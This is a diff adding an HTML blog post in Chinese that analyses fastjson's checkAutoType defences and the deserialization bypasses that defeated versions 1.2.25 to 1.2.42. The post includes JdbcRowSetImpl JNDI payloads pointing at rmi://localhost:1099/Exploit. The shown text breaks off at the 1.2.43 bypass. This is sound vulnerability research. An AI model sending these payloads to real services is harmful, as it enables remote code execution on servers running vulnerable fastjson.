@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="概述FastJson的防御是通过白名单+黑名单的机制，由于白名单的限制，对漏洞绕过带来了一定的挑战。本文梳理了fastjson历史上反序列化漏洞的利用原理，以及他们对应的防御和绕过。 12.2.25版本修复在&lt;&#x3D;12.2.24之后，fastjson在12.2.25版本加入了checkAutoType方法，该方法通过以下方式进行类的过滤：  默认开启AutoTypeSupport，只允许白名单">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson&#x2F;fastjson反序列化的防御和绕过">
+<meta property="og:url" content="http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="Homer&#39;s blog">
+<meta property="og:description" content="概述FastJson的防御是通过白名单+黑名单的机制，由于白名单的限制，对漏洞绕过带来了一定的挑战。本文梳理了fastjson历史上反序列化漏洞的利用原理，以及他们对应的防御和绕过。 12.2.25版本修复在&lt;&#x3D;12.2.24之后，fastjson在12.2.25版本加入了checkAutoType方法，该方法通过以下方式进行类的过滤：  默认开启AutoTypeSupport，只允许白名单">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://homerqing.github.io/web/pictures/fastjson1.png">
+<meta property="og:image" content="http://homerqing.github.io/web/pictures/fastjson2.png">
+<meta property="article:published_time" content="2020-04-10T15:28:24.626Z">
+<meta property="article:modified_time" content="2020-04-10T15:28:24.627Z">
+<meta property="article:author" content="Homer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://homerqing.github.io/web/pictures/fastjson1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>fastjson/fastjson反序列化的防御和绕过</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/posts/">Writing</a></li>
+         
+          <li><a href="http://github.com/sergodeeva" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/04/10/tomat/CVE-2020-1938%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/04/10/fastjson/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&text=fastjson/fastjson反序列化的防御和绕过" target="_blank" rel="noopener"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&title=fastjson/fastjson反序列化的防御和绕过" target="_blank" rel="noopener"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&is_video=false&description=fastjson/fastjson反序列化的防御和绕过" target="_blank" rel="noopener"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson/fastjson反序列化的防御和绕过&body=Check out this article: http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&title=fastjson/fastjson反序列化的防御和绕过" target="_blank" rel="noopener"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&title=fastjson/fastjson反序列化的防御和绕过" target="_blank" rel="noopener"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&title=fastjson/fastjson反序列化的防御和绕过" target="_blank" rel="noopener"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&title=fastjson/fastjson反序列化的防御和绕过" target="_blank" rel="noopener"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://homerqing.github.io/2020/04/10/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87/&name=fastjson/fastjson反序列化的防御和绕过&description=" target="_blank" rel="noopener"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-2-25版本修复"><span class="toc-number">2.</span> <span class="toc-text">12.2.25版本修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-25-1-2-41绕过"><span class="toc-number">3.</span> <span class="toc-text">1.2.25-1.2.41绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-42修复"><span class="toc-number">4.</span> <span class="toc-text">1.2.42修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-42绕过"><span class="toc-number">5.</span> <span class="toc-text">1.2.42绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-43修复"><span class="toc-number">6.</span> <span class="toc-text">1.2.43修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-43绕过"><span class="toc-number">7.</span> <span class="toc-text">1.2.43绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过1："><span class="toc-number">7.1.</span> <span class="toc-text">绕过1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过2："><span class="toc-number">7.2.</span> <span class="toc-text">绕过2：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-45修复"><span class="toc-number">8.</span> <span class="toc-text">1.2.45修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-45绕过-通杀POC"><span class="toc-number">9.</span> <span class="toc-text">1.2.45绕过-通杀POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-47修复"><span class="toc-number">10.</span> <span class="toc-text">1.2.47修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-47绕过"><span class="toc-number">11.</span> <span class="toc-text">1.2.47绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-6修复"><span class="toc-number">12.</span> <span class="toc-text">1.2.6修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">13.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        fastjson/fastjson反序列化的防御和绕过
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Homer's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2020-04-10T15:28:24.626Z" itemprop="datePublished">2020-04-10</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>FastJson的防御是通过白名单+黑名单的机制，由于白名单的限制，对漏洞绕过带来了一定的挑战。本文梳理了fastjson历史上反序列化漏洞的利用原理，以及他们对应的防御和绕过。</p>
+<h2 id="12-2-25版本修复"><a href="#12-2-25版本修复" class="headerlink" title="12.2.25版本修复"></a>12.2.25版本修复</h2><p>在&lt;=12.2.24之后，fastjson在12.2.25版本加入了<code>checkAutoType</code>方法，该方法通过以下方式进行类的过滤：</p>
+<ol>
+<li>默认开启AutoTypeSupport，只允许白名单中的类通过；</li>
+<li>定义黑名单，不允许黑名单中的类通过。</li>
+</ol>
+<p>代码的修改部分在<code>com.alibaba.fastjson.parser.DefaultJSONParser:parseObject</code>中，对比看一下<code>12.2.24</code>和<code>12.2.25</code>的区别：  </p>
+<p>12.2.24版本： </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">clazz = TypeUtils.loadClass(ref, <span class="keyword">this</span>.config.getDefaultClassLoader());</span><br><span class="line">ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br><span class="line">thisObj = deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>12.2.25版本： </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">Class&lt;?&gt; clazz = <span class="keyword">this</span>.config.checkAutoType(ref, (Class)<span class="keyword">null</span>);</span><br><span class="line">ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br><span class="line">thisObj = deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>可见在<code>12.2.25</code>中会先对类进行检查，然后才进入反序列化，我们看看<code>checkAutoType</code>的实现，下面给出关键代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;com.alibaba.fastjson.parser.Parseronfig:checkAutoType</span><br><span class="line">......</span><br><span class="line">if (this.autoTypeSupport || expectClass !&#x3D; null) &#123;</span><br><span class="line">    int i;</span><br><span class="line">    String deny;</span><br><span class="line">    &#x2F;&#x2F;遍历白名单进行检查，只允许加载白名单中的class</span><br><span class="line">    for(i &#x3D; 0; i &lt; this.acceptList.length; ++i) &#123;</span><br><span class="line">        deny &#x3D; this.acceptList[i];</span><br><span class="line">        if (className.startsWith(deny)) &#123;</span><br><span class="line">            return TypeUtils.loadClass(typeName, this.defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;遍历黑名单，匹配到之后就报错</span><br><span class="line">    for(i &#x3D; 0; i &lt; this.denyList.length; ++i) &#123;</span><br><span class="line">        deny &#x3D; this.denyList[i];</span><br><span class="line">        if (className.startsWith(deny)) &#123;</span><br><span class="line">            throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">if (!this.autoTypeSupport) &#123;</span><br><span class="line">    String accept;</span><br><span class="line">    int i;</span><br><span class="line">    for(i &#x3D; 0; i &lt; this.denyList.length; ++i) &#123;</span><br><span class="line">        accept &#x3D; this.denyList[i];</span><br><span class="line">        if (className.startsWith(accept)) &#123;</span><br><span class="line">            throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(i &#x3D; 0; i &lt; this.acceptList.length; ++i) &#123;</span><br><span class="line">        accept &#x3D; this.acceptList[i];</span><br><span class="line">        if (className.startsWith(accept)) &#123;</span><br><span class="line">            clazz &#x3D; TypeUtils.loadClass(typeName, this.defaultClassLoader);</span><br><span class="line">            if (expectClass !&#x3D; null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">没有匹配到黑白名单的进入这里进行类加载</span><br><span class="line">if (this.autoTypeSupport || expectClass !&#x3D; null) &#123;</span><br><span class="line">    clazz &#x3D; TypeUtils.loadClass(typeName, this.defaultClassLoader);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>可以看到fastjson通过白名单+黑名单的方式进行匹配，这里加入了一个<code>autoTypeSupport</code>变量来参与黑白名单的匹配，注意看上面的黑白名单匹配有两个流程：</p>
+<ol>
+<li>当<code>autoTypeSupport</code>为默认的false的时候，进入下面那个<code>if</code>流程，在这个流程中，首先匹配黑名单，匹配到了就报错，然后匹配白名单，没匹配到就报错，说明这里会强制要求clazz在黑名单之外且在白名单之内。</li>
+<li>当<code>autoTypeSupport</code>为true的时候，会进入上面那个<code>if</code>流程，首先匹配白名单，匹配到了就进行加载，没匹配到就进入黑名单匹配，如果在黑名单之内的话就报错。</li>
+</ol>
+<p>总结：当<code>autoTypeSupport</code>为默认的false的时候会强制要求在白名单内和黑名单外；当<code>autoTypeSupport</code>为true的时候，只要求在黑名单外。</p>
+<p>所以这里幸运的看到fastjson还是留了一手，服务端可以通过以下代码手动关闭白名单：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></pre></td></tr></table></figure>
+<p>白名单是通过手动关闭的，所以绕过仍然存在非常大的限制，后续的几个绕过都是在白名单被手动关闭的前提下才可以利用成功。</p>
+<p>我们再看一下黑名单中的内容，包含了<code>com.sun.</code>彻底封死了jdk原生类：  </p>
+<p><img src="/web/pictures/fastjson1.png" alt="image"></p>
+<p>当我们用之前的POC运行到这里的时候会匹配到黑名单并抛出错误。  </p>
+<p><img src="/web/pictures/fastjson2.png" alt="image"></p>
+<h2 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h2><p>上面的<code>checkAutoType</code>乍一看好像没什么问题，但是这里存在一个逻辑缺陷，即不在黑名单也不在白名单中的类将被加载，也就是进入下面的代码，这里是一个突破口。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;com.alibaba.fastjson.parser.Parseronfig:checkAutoType</span><br><span class="line">没有匹配到黑白名单的进入这里进行类加载</span><br><span class="line">if (this.autoTypeSupport || expectClass !&#x3D; null) &#123;</span><br><span class="line">    clazz &#x3D; TypeUtils.loadClass(typeName, this.defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们重点看一看<code>TypeUtils.loadClass</code>，看最后一个if判断，L开头以及;结尾的class将被去除头尾部分进行加载。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//L开头以及;结尾的class将被去除头尾部分进行加载</span></span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</span><br><span class="line">        String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以，当我们传入的类名为<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>的时候，由于该类名不满足黑名单条件<code>startsWith(黑名单)</code>，所以会走到上面那个if判断，然后判读条件被取掉首尾，后面的流程和&lt;=12.2.24相同，实现RCE。</p>
+<p>所以POC是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;@type&#39;: &#39;Lcom.sun.rowset.JdbcRowSetImpl;&#39;,</span><br><span class="line">    &#39;dataSourceName&#39;: &#39;rmi:&#x2F;&#x2F;localhost:1099&#x2F;Exploit&#39;,</span><br><span class="line">    &#39;autoCommit&#39;: &#39;true&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用栈:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:742, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseRest:1240, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:370, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1335, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1301, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:152, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:162, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:131, JSON (com.alibaba.fastjson)</span><br><span class="line">testJdbcRowSetImpl:17, OtherPOC (com.l1nk3r.fastjson)</span><br><span class="line">main:9, OtherPOC (com.l1nk3r.fastjson)</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-42修复"><a href="#1-2-42修复" class="headerlink" title="1.2.42修复"></a>1.2.42修复</h2><p>这次修复比较简单粗暴，在<code>com.alibaba.fastjson.parser.ParserConfig:checkAutoType</code>中会先判断类名，如果是L开头，;结尾，删去开头结尾，但只进行了一次删除，所以当我们在类名前后设置两个L和;的时候即可绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;com.alibaba.fastjson.parser.ParserConfig:checkAutoType</span><br><span class="line">&#x2F;&#x2F;判断类名并删除首尾的L和;</span><br><span class="line">if ((((BASIC</span><br><span class="line">        ^ className.charAt(0))</span><br><span class="line">        * PRIME)</span><br><span class="line">        ^ className.charAt(className.length() - 1))</span><br><span class="line">        * PRIME &#x3D;&#x3D; 0x9198507b5af98f0L)</span><br><span class="line">&#123;</span><br><span class="line">    className &#x3D; className.substring(1, className.length() - 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-42绕过"><a href="#1-2-42绕过" class="headerlink" title="1.2.42绕过"></a>1.2.42绕过</h2><p>经过上文的阅读应该十分理解这里的绕过原理了，所以直接给POC，调用栈是相同的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;@type&#39;: &#39;LLcom.sun.rowset.JdbcRowSetImpl;;&#39;,</span><br><span class="line">    &#39;dataSourceName&#39;: &#39;rmi:&#x2F;&#x2F;localhost:1099&#x2F;Exploit&#39;,</span><br><span class="line">    &#39;autoCommit&#39;: &#39;true&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-43修复"><a href="#1-2-43修复" class="headerlink" title="1.2.43修复"></a>1.2.43修复</h2><p>本次修复也是很简单暴力的，不过也是有效的，这次在上一次修复的地方加了一个抛出异常的动作，当类名开头匹配到<code>LL</code>就会报错，如果是一个<code>L</code>和<code>;</code>则会删除收尾。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.parser.ParserConfig:checkAutoType</span></span><br><span class="line"><span class="keyword">if</span> ((((BASIC</span><br><span class="line">    ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">    * PRIME)</span><br><span class="line">    ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">    * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//增加了if判断，包含两个L的时候则会抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> ((((BASIC</span><br><span class="line">        ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">        * PRIME)</span><br><span class="line">        ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">        * PRIME == <span class="number">0x9195c07b5af5345L</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 9195c07b5af5345</span></span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-43绕过"><a href="#1-2-43绕过" class="headerlink" title="1.2.43绕过"></a>1.2.43绕过</h2><h3 id="绕过1："><a href="#绕过1：" class="headerlink" title="绕过1："></a>绕过1：</h3><p>本次绕过的地方其实之前就有看到过，在<code>TypeUtils.loadClass</code>中，我们之前关注的是下面那个if，上线那个if判断若类名以<code>[</code>开头，则会直接加载。</p>
